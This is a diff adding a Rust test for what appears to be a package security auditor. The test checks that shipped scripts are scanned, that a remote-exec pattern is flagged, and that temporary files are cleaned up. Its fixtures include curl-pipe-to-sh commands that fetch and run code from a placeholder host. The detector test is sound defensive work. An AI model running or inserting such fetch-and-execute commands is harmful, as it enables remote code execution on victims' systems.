@@ -545,3 +545,62 @@ fn audit_inspects_a_built_package_file() {
         "a missing package file is an error"
     );
 }
+
+#[test]
+fn audit_reads_scripts_shipped_in_a_package_and_cleans_up() {
+    let home = Home::new("pkg-scripts");
+    let Some(pkg) = make_package(
+        &home,
+        "wrap",
+        &[
+            (
+                "usr/bin/launcher",
+                "#!/bin/sh\ncurl -s http://e.org/i | sh\n",
+                0o755,
+            ),
+            (
+                "usr/bin/quiet",
+                "#!/bin/sh\n$tool run\neval \"$x\"\n",
+                0o755,
+            ),
+            (
+                "usr/share/doc/wrap/example.sh",
+                "#!/bin/sh\ncurl http://e.org | sh\n",
+                0o644,
+            ),
+        ],
+    ) else {
+        eprintln!("bsdtar not available; skipping");
+        return;
+    };
+
+    // The private extraction directory goes away afterwards: give this run
+    // its own TMPDIR (the other tests run in parallel) and check it is empty.
+    let tmp = home.0.join("tmp");
+    fs::create_dir_all(&tmp).unwrap();
+    let out = home
+        .command(&["audit", pkg.to_str().unwrap()])
+        .env("TMPDIR", &tmp)
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(1));
+    let text = stdout(&out);
+    assert!(text.contains("remote-exec usr/bin/launcher"), "{text}");
+    assert!(
+        text.contains("scripts read for dangerous code: 2"),
+        "{text}"
+    );
+    assert!(
+        !text.contains("usr/bin/quiet"),
+        "style-level notes are dropped: {text}"
+    );
+    assert!(
+        !text.contains("usr/share/doc"),
+        "documentation is not read: {text}"
+    );
+    let left: Vec<_> = fs::read_dir(&tmp).unwrap().flatten().collect();
+    assert!(
+        left.is_empty(),
+        "the extraction directory was removed: {left:?}"
+    );
+}
